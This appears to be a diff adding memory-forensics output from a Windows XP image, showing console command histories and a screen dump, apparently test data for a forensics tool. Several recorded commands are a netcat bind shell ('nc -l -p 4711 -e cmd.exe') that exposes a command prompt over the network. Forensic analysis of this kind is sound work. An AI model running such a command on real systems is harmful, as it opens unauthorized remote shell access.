@@ -1,0 +1,46 @@
+**************************************************
+ConsoleProcess: csrss.exe Pid: 564
+Console: 0x4f23b0 CommandHistorySize: 50
+HistoryBufferCount: 3 HistoryBufferMax: 4
+OriginalTitle: %SystemRoot%\system32\cmd.exe
+Title: C:\WINDOWS\system32\cmd.exe - nc -l -p 4711 -e cmd.exe
+AttachedProcess: cmd.exe Pid: 1244 Handle: 0x6a8
+AttachedProcess: NC.EXE Pid: 4008 Handle: 0x5b0
+AttachedProcess: cmd.exe Pid: 3936 Handle: 0x338
+----
+CommandHistory: 0x127f9c0 Application: cmd.exe Flags: Allocated
+CommandCount: 0 LastAdded: -1 LastDisplayed: -1
+FirstCommand: 0 CommandCountMax: 50
+ProcessHandle: 0x6a8
+----
+CommandHistory: 0x1273488 Application: NC.EXE Flags: Allocated
+CommandCount: 0 LastAdded: -1 LastDisplayed: -1
+FirstCommand: 0 CommandCountMax: 50
+ProcessHandle: 0x5b0
+----
+CommandHistory: 0x4f4d88 Application: cmd.exe Flags: Allocated, Reset
+CommandCount: 3 LastAdded: 2 LastDisplayed: 0
+FirstCommand: 0 CommandCountMax: 50
+ProcessHandle: 0x338
+Cmd #0 at 0x4f2370: nc -l -p 4711 -e cmd.exe
+Cmd #1 at 0x12732d8: cd Desktop
+Cmd #2 at 0x1273398: nc -l -p 4711 -e cmd.exe
+----
+Screen 0x4f2ab0 X:80 Y:300
+Dump:
+Microsoft Windows XP [Version 5.1.2600]                                         
+(C) Copyright 1985-2001 Microsoft Corp.                                         
+                                                                                
+C:\Documents and Settings\Peter Haag>nc -l -p 4711 -e cmd.exe                   
+'nc' is not recognized as an internal or external command,                      
+operable program or batch file.                                                 
+                                                                                
+C:\Documents and Settings\Peter Haag>cd Desktop                                 
+                                                                                
+C:\Documents and Settings\Peter Haag\Desktop>nc -l -p 4711 -e cmd.exe           
+**************************************************
+ConsoleProcess: csrss.exe Pid: 564
+Console: 0x12735d0 CommandHistorySize: 50
+HistoryBufferCount: 2 HistoryBufferMax: 4
+OriginalTitle: ?OystemRoot%\system32\cmd.exe
+Title: ?O\WINDOWS\system32\cmd.exe
